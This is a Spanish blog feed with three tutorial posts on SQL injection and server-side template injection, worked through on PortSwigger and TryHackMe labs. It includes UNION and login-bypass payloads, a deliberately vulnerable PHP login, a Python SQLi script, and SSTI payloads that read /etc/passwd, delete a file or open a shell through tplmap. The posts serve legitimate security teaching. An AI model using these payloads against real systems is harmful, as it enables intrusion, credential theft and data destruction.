<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL injection - Parte 2</title>
      <link href="/2020/11/06/SQL_i_PART_2/"/>
      <url>/2020/11/06/SQL_i_PART_2/</url>
      
        <content type="html"><![CDATA[<h1><a href="#sql-injection-parte-2" class="header-anchor">#</a><span id="sql-injection-parte-2">SQL Injection - Parte 2</span></h1><h2><a href="#resumen-del-post" class="header-anchor">#</a><span id="resumen-del-post">Resumen del post</span></h2><p>En esta segunda parte voy a explicar un poco mi metodología siguiendo los pasos que nos indican <a href="https://portswigger.net" target="_blank" rel="noopener">portswigger</a>. Como podemos identificar las columnas y extraer información de la base de datos.<br>Finalmente voy a compartir el script que he creado para ver como podríamos utilizar Python para automatizar la extracción de información.</p><h2><a href="#identificar-el-numero-de-columnas" class="header-anchor">#</a><span id="identificar-el-numero-de-columnas">Identificar el numero de columnas</span></h2><p>Esto realmente es muy importante, ya que muchas veces hay algunas columnas invisibles que necesitamos conocer o simplemente ver el tipo de variable que se puede almacenar en cada parámetro que pasamos.</p><p>Primero de todo podemos identificar donde hay la sentencia sql y donde se muestra esta información.<br>En este caso simplemente vemos que muestra 3 columnas y el parámetro se encuentra en la URL lo cual es una petición de tipo GET.</p><p><img src="https://i.imgur.com/QHaClNu.png" alt="Portswigger1.png"></p><p>Este reto simplemente consiste en identificar el número de columnas. Para ello podemos hacer un SELECT NULL,NULL … Tantas columnas pueda haber. Eso lo que hace es imprimir un espacio nulo e identificar el número exacto de columnas, ya que si no la página nos muestra un error. Para hacer esta sentencia necesitamos conocer como funciona UNION esto lo que hace es unir dos tablas en una.<br>Primero identificamos cuantas columnas hay:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ac9f1f2d1e006eb580617223003300d1.web-security-academy.net&#x2F;filter?category&#x3D;Pets&#39; UNION SELECT NULL,NULL,NULL -- -</span><br></pre></td></tr></table></figure><p>Una vez sabemos que hay 3 ya podemos empezar a extraer información identificando el tipo de variable que hay.<br>Ejemplo, vamos a mostrar información creada por nosotros.<br>Url :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ac9f1f2d1e006eb580617223003300d1.web-security-academy.net&#x2F;filter?category&#x3D;Pets&#39; UNION SELECT 1,&#39;abc&#39;,3 -- -</span><br></pre></td></tr></table></figure><p><img src="https://imgur.com/WOjdhR0.png" alt="SQLi, detect .png"></p><p>Identificamos que el texto está en la segunda columna de nuestra petición y la 1.ª y la 3.ª son de tipo int, lo cual no podemos extraer mucha información. Para enumerar podemos utilizar un <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener">cheat sheet muy bueno de portswigger</a> Que nos puede ayudar a ver la base de datos que estamos atacando.</p><p>Para ver la versión utilizo esta sentencia:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ac9f1f2d1e006eb580617223003300d1.web-security-academy.net&#x2F;filter?category&#x3D;Pets&#39;UNION SELECT NULL,version(),NULL -- -</span><br></pre></td></tr></table></figure><p><img src="https://imgur.com/5IOEi0O.png" alt="VERSION .png"></p><p>Ahora finalmente voy a compartir un pequeño script creado en Python para poder extraer esta información. Para poder explicar-lo me hubiese gustado crear un video a YouTube pero actualmente no cuento con micro y lo cual tengo que compartir estos tutoriales por escrito.<br>Esto me ha ayudado mucho y me ha servido de mucha ayuda para extraer informaciones de tablas y poder extraer información de una Blind SQLi. Que eso ya lo hablaremos en otra parte. Y también este script que comparto esta de forma muy basica, ya que animo a que puedas crear tu propio script y tenerlo como idea.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3 </span><br><span class="line"></span><br><span class="line">import requests </span><br><span class="line">import re </span><br><span class="line">import sys </span><br><span class="line">import signal </span><br><span class="line"></span><br><span class="line"># Global vars </span><br><span class="line">host &#x3D; &#39;ac201f2c1e53acaf801df8b6004400b5&#39;</span><br><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;&#123;0&#125;.web-security-academy.net&#x2F;filter&#39;.format(host)</span><br><span class="line"></span><br><span class="line">def signal_handler(sig, frame):</span><br><span class="line">    print(&#39;\n[Ctrl + c ] Saliendo ...&#39;)</span><br><span class="line">    sys.exit(1)</span><br><span class="line">signal.signal(signal.SIGINT, signal_handler)</span><br><span class="line"></span><br><span class="line">def sqli_requests(sqli):</span><br><span class="line">    try: </span><br><span class="line">        header&#x3D; &#123;</span><br><span class="line">                    &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:78.0) Gecko&#x2F;20100101 Firefox&#x2F;78.0&#39;,</span><br><span class="line">                    &#39;Accept&#39; : &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&#39;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        payload &#x3D; &#123;&#39;category&#39;: sqli&#125;</span><br><span class="line"></span><br><span class="line">        r &#x3D; requests.get(url,params&#x3D;payload, headers&#x3D;header)</span><br><span class="line">        </span><br><span class="line">        # Logrado el laboratorio</span><br><span class="line">        if re.search(r&#39;&lt;p&gt;Solved&lt;&#x2F;p&gt;&#39;, r.text):</span><br><span class="line">            print(&#39;Congratulations, you solved the lab!&#39;)</span><br><span class="line">        </span><br><span class="line">        # Filtrar la info</span><br><span class="line">        data_filter &#x3D; re.findall(r&#39;(?:&lt;tbody&gt;)([\s\S]*)(?:&lt;&#x2F;tbody&gt;)&#39;, r.text)</span><br><span class="line">        data_filter &#x3D; re.findall(r&#39;(?&lt;&#x3D;&gt;)(.*?)(?&#x3D;&lt;\&#x2F;)&#39;,data_filter[0])</span><br><span class="line"></span><br><span class="line">        print(r,url)</span><br><span class="line">        return data_filter</span><br><span class="line"></span><br><span class="line">    except:</span><br><span class="line">        print(r.url)</span><br><span class="line">        print(&quot;ERROR : &quot;, sys.exc_info()[0])</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">    while True: </span><br><span class="line">        sqli&#x3D;input(&#39;SQLI: &#39;)</span><br><span class="line">    </span><br><span class="line">        data &#x3D; sqli_requests(sqli)</span><br><span class="line">        print(data)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>OUTPUT</p><p><img src="https://imgur.com/dVGRaAX.png" alt="OUTPUT1.png"></p><p>Si quieres ver como progresa mi script lo tengo público en mi repositorio, <a href="https://github.com/Th3FirstAvenger/SQL-Injection" target="_blank" rel="noopener">Repositorio de GitHub</a>.</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Hacking Web </category>
          
          <category> SQLI </category>
          
          <category> PortSwigger </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> SQLI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL injection - Parte 1</title>
      <link href="/2020/11/05/SQL_i_PART_1/"/>
      <url>/2020/11/05/SQL_i_PART_1/</url>
      
        <content type="html"><![CDATA[<h1><a href="#sql-injection-parte-1" class="header-anchor">#</a><span id="sql-injection-parte-1">SQL Injection - Parte 1</span></h1><h2><a href="#resumen-del-post" class="header-anchor">#</a><span id="resumen-del-post">Resumen del post</span></h2><p>Mi intención de este primer post hablando de SQL injection es explicar y ayudar entender como funciona. Saber un poco los primeros pasos para lograr identificar y entender esta vulnerabilidad. Finalmente crearemos un ejempro para explicar como funcionaria un bypass en el login.</p><h2><a href="#que-es-sql-injection" class="header-anchor">#</a><span id="que-es-sql-injection">¿Que es SQL injection?</span></h2><p>Sql Injection o Inyección SQL es una vulnerabilidad que permite al atacante enviar o “inyectar” instrucciones SQL de forma maliciosa dentro del código SQL. En otras palabras, se aprovecha de poder modificar el comportamiento de las consultas realizadas a través de parámetros no deseados eso es debido a una incorrecta comprobación o filtrado de variables utilizadas que contienen código SQL.</p><h2><a href="#como-puedo-reconozer-una-sql-injection" class="header-anchor">#</a><span id="como-puedo-reconozer-una-sql-injection">¿Como puedo reconozer una SQL injection?</span></h2><p>Como he dicho anteriormente, este tipo de vulnerabilidad se aprovecha de una validación mediante sentencias SQL. Lo cual primero es necesario saber lo básico de SQL. Para ello una buena forma de aprender el comportamiento de una web es creando tu propio laboratorio de pruebas.<br>Yo recomiendo utilizar docker, ya que es muy fácil y ocupa muy poco. </p><p>Como podemos ver ocupan muy poco espacio.<br><img src="https://i.imgur.com/jBMiEHm.png" alt="images.png"></p><p>Como ejemplo voy a utilizar MySQL pero lo suyo seria identificar que tipo de base de datos estamos atacando.<br>Primero de todo creamos nuestra base de datos y la información que queremos.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; CREATE DATABASE Users;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use Users;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; CREATE TABLE Users (</span><br><span class="line">    -&gt; id int(10),</span><br><span class="line">    -&gt; usuario varchar(30),</span><br><span class="line">    -&gt; password varchar(30)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO Users </span><br><span class="line">    -&gt; VALUES(1,&#39;J4ck21&#39;,&#39;Est4EsMiPassword&#39;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">mysql&gt; INSERT INTO Users</span><br><span class="line">    -&gt; VALUES(2,&#39;Admin&#39;,&#39;SoyELADMIN&#39;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure><p>Ahora ya podemos ver lo que hay en esta tabla.<br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM Users;</span><br><span class="line">+<span class="comment">------+---------+------------------+</span></span><br><span class="line">| id   | usuario | password         |</span><br><span class="line">+<span class="comment">------+---------+------------------+</span></span><br><span class="line">|    1 | J4ck21  | Est4EsMiPassword |</span><br><span class="line">|    2 | Admin   | SoyELADMIN       |</span><br><span class="line">+<span class="comment">------+---------+------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><br>Imaginemos que estamos en una página de login y la aplicación web tiene la siguiente sentencia:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$user = $_POST[<span class="string">'usuario'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">"select usuario, password from users where usuario='.$user.' and password='.$password.' limit 0,1"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$rows = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($rows)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Login successful"</span> ;</span><br><span class="line">create_session();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"login data invalid"</span>;</span><br><span class="line">&#125; </span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><p>Vamos a intentar hacer lo mismo pero intentando simular los parámetros que pondríamos en la petición post que hace para guardar el usuario y contraseña del admin.</p><h4><a href="#credenciales-correctas" class="header-anchor">#</a><span id="credenciales-correctas">Credenciales correctas</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT usuario,password FROM Users where usuario='Admin' and password='SoyELADMIN' limit 1;</span><br><span class="line">+<span class="comment">---------+------------+</span></span><br><span class="line">| usuario | password   |</span><br><span class="line">+<span class="comment">---------+------------+</span></span><br><span class="line">| Admin   | SoyELADMIN |</span><br><span class="line">+<span class="comment">---------+------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h4><a href="#credenciales-erroneas" class="header-anchor">#</a><span id="credenciales-erroneas">Credenciales erroneas</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT usuario,password FROM Users where usuario='Admin' and password='NOSOYELADMIN' limit 1;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>La segunda sentencia vemos que no nos devuelve filas por lo que devuelve false en el login. Para ello simplemente necesitamos que nos devuelva true y lo único que podemos hacer es inyectar código a través de la petición POST.</p><p>Para ello podríamos utilizar la mítica sentencia</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'OR 1=1 <span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p>Que está pasando en realidad con esta sentencia?¿</p><p>Nos devuelve true y encima todo lo que contiene la tabla.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT usuario,password FROM Users where usuario='Admin' and password='NOSOYELADMIN'OR 1=1;-- - limit 1;</span><br><span class="line">+<span class="comment">---------+------------------+</span></span><br><span class="line">| usuario | password         |</span><br><span class="line">+<span class="comment">---------+------------------+</span></span><br><span class="line">| J4ck21  | Est4EsMiPassword |</span><br><span class="line">| Admin   | SoyELADMIN       |</span><br><span class="line">+<span class="comment">---------+------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Hacking Web </category>
          
          <category> SQLI </category>
          
          <category> PortSwigger </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> SQLI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Server-side template injection</title>
      <link href="/2020/07/08/SSTI/"/>
      <url>/2020/07/08/SSTI/</url>
      
        <content type="html"><![CDATA[<h1><a href="#ssti" class="header-anchor">#</a><span id="ssti">SSTI</span></h1><p><img src="https://i.imgur.com/Q2sEwHS.png" alt></p><h2><a href="#que-es-stti" class="header-anchor">#</a><span id="que-es-stti">Que és STTI</span></h2><p>Sus siglas significan “Server Side Template Injection”, y lo que ocurre en esta vulnerabilidad es cuando una pagina web es dinámica i se habilita introducir datos hacia paginas web o emails. Eso permite el atacante introducir una plantilla y así habilitar la inyección al lado del servidor. Eso es bastante fácil de confundir con el Cross-Site Scripting (XSS) o simplemente omitirlo.<br>A diferencia del XXS, la inyección de plantillas se puede utilizar para atacar directamente los componentes internos de los servidores web y a menudo obtener una ejecución remota (RCE), eso se convierte en un punto potencial para hacer el pivoting.</p><p>Ejemplo de código, vemos que pregunta un nombre en un formulario y después contesta con un Hello (nombre introducido).</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">template = """</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>\</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span>\</span><br><span class="line">What is 2+2:<span class="tag">&lt;<span class="name">br</span>&gt;</span>\</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span>\</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"sumbit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span>\</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>%s! <span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span>""" %user_input</span><br><span class="line"></span><br><span class="line">return render_template_string(template)</span><br></pre></td></tr></table></figure><h2><a href="#identificacion" class="header-anchor">#</a><span id="identificacion">Identificación</span></h2><p>Lo primero que se tiene que hacer es comprobar és intrucciones en texto plano, existen varias plantillas distintas y se tiene que identificar el payload correspondiente. Las expressiones más comunes són: </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Var puede ser un calculo como &#123;&#123;20+1&#125;&#125; o &#123;&#123;3*'7'&#125;&#125;</span><br><span class="line">&#123;var&#125; $&#123;var&#125; <span class="tag">&lt;<span class="name">%=</span> <span class="attr">var</span> %&gt;</span> [% var %]</span><br></pre></td></tr></table></figure><p>Si utilizamos el mismo ejemplo anterior y la respuesta és:</p><blockquote><p> 21</p></blockquote><p><img src="https://i.imgur.com/oXbEo2D.png" alt></p><p>Eso significa que hemos encontrado el SSTI. Para seguir podemos buscar los payloads para la ejecucion de comandos, lo he sacado de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#read-remote-file" target="_blank" rel="noopener">PayloadsAllTheThings</a>.</p><h2><a href="#explotacion" class="header-anchor">#</a><span id="explotacion">Explotación</span></h2><p>Para leer contenido podemos utilizar,  con esto tendriamos un LFI. </p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() &#125;&#125;</span></span><br></pre></td></tr></table></figure><p>Si queremos ejecucion de codigo podemos utilizar</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;config.__class__.__init__.__globals__['os'].popen(cat /etc/passwd).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>Existe un script en python que sirve para hacer una explotacion automàtica, es <a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">tplmap</a> y la sintaxis bàsica és:</p><h2><a href="#ejemplos" class="header-anchor">#</a><span id="ejemplos">Ejemplos</span></h2><h3><a href="#reto-1-basic-portswigger" class="header-anchor">#</a><span id="reto-1-basic-portswigger">Reto 1 - Basic PortSwigger</span></h3><p>Este ejemplo es en una lab de <a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic" target="_blank" rel="noopener">https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic</a><br>A primera vista no vemos nada fuera de lo commun.<br><img src="https://i.imgur.com/IG7X5Eh.png" alt><br>Pero si le damos a <code>View details</code> al primer producto podemos ver que nos devuelve un mensage en tipo post.</p><p>URL : </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ac7d1f211fbf166080f8360700e500b5.web-security-academy.net&#x2F;?message&#x3D;Unfortunately%20this%20product%20is%20out%20of%20stock</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/R0PYdBn.png" alt><br>Parece que podemos modificar el texto pero no ejecuta lo que hemos hecho anteriormente. Con este payload logramos que nos debuelba un message de error.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message&#x3D;&lt;%&#x3D; 20+1%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/JJ4IzIC.png" alt></p><p>Una vez identificado la inyeccion vamos a probar de hacer primero el RCE.<br>Lo podemos hacer con los siguientes payloads:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%&#x3D; system(&#39;cat &#x2F;etc&#x2F;passwd&#39;) %&gt;</span><br><span class="line">&lt;%&#x3D; &#96;ls &#x2F;&#96; %&gt;</span><br><span class="line">&lt;%&#x3D; IO.popen(&#39;ls &#x2F;&#39;).readlines()  %&gt;</span><br><span class="line">&lt;% require &#39;open3&#39; %&gt;&lt;% @a,@b,@c,@d&#x3D;Open3.popen3(&#39;whoami&#39;) %&gt;&lt;%&#x3D; @b.readline()%&gt;</span><br><span class="line">&lt;% require &#39;open4&#39; %&gt;&lt;% @a,@b,@c,@d&#x3D;Open4.popen4(&#39;whoami&#39;) %&gt;&lt;%&#x3D; @c.readline()%&gt;</span><br></pre></td></tr></table></figure><p>El payload que utilizo en html encoded. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message&#x3D;%3C%&#x3D;%20&#96;id&#96;%20%%3E</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/LDdj8n3.png" alt></p><p>Ahora seguimos con el objetivo: </p><p><img src="https://i.imgur.com/xs20tLY.png" alt></p><p>Asi que con el payload siguiente lo completamos.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message&#x3D;%3C%&#x3D;%20&#96;rm%20&#x2F;home&#x2F;carlos&#x2F;morale.txt&#96;%20%%3E</span><br></pre></td></tr></table></figure><p>Y completamos la lab. </p><p><img src="https://i.imgur.com/l7eRhjL.png" alt></p><h3><a href="#reto-2-tryhackme" class="header-anchor">#</a><span id="reto-2-tryhackme">Reto 2 - TryHackMe</span></h3><p>És el que he utilizado como ejemplo asi que ya identificamos que és una plantilla jinja2. Asi que podemos utilizar los siguientes payloads para comprovarlo. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;4*4&#125;&#125;[[5*5]]</span><br><span class="line">&#123;&#123;7*&#39;7&#39;&#125;&#125; would result in 7777777</span><br><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br></pre></td></tr></table></figure><p>Ahora vamos a probar de leer la flag. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Ejecucion mediante curl </span><br><span class="line">curl -X POST -d &#39;name&#x3D;%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27cat+%2Fflag%27%29.read%28%29%7D%7D&#39; http:&#x2F;&#x2F;10.10.171.251&#x2F;</span><br></pre></td></tr></table></figure><p>Output</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;    &lt;form action&#x3D;&quot;&#x2F;&quot; method&#x3D;&quot;post&quot;&gt;      What&#39;s 2+2&lt;br&gt;      &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;    &lt;&#x2F;form&gt;&lt;p&gt;cooctus</span><br><span class="line">&lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;%</span><br></pre></td></tr></table></figure><p>Lo interessante seria obtener un shell, eso lo podemos hacer con el tlpmap. Para ello debemos inicarle el siguiente comando.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tplmap.py -u http:&#x2F;&#x2F;10.10.171.251 -d &#39;name&#39; --os-shell -e Jinja2</span><br></pre></td></tr></table></figure><p><strong>Labs para practicar</strong> :<br><a href="https://github.com/s4n7h0/xvwa" target="_blank" rel="noopener">https://github.com/s4n7h0/xvwa</a><br><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting" target="_blank" rel="noopener">https://portswigger.net/web-security/server-side-template-injection/exploiting</a></p><p><strong>Referencias</strong>:<br><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection" target="_blank" rel="noopener">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection</a><br><a href="https://portswigger.net/research/server-side-template-injection" target="_blank" rel="noopener">https://portswigger.net/research/server-side-template-injection</a><br><a href="https://tryhackme.com/room/zthobscurewebvulns" target="_blank" rel="noopener">https://tryhackme.com/room/zthobscurewebvulns</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> SSTI </category>
          
          <category> Hacking Web </category>
          
          <category> SSTI </category>
          
          <category> PortSwigger </category>
          
          <category> THM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackeando con Docker</title>
      <link href="/2020/07/03/Hackeando-con-Docker/"/>
      <url>/2020/07/03/Hackeando-con-Docker/</url>
      
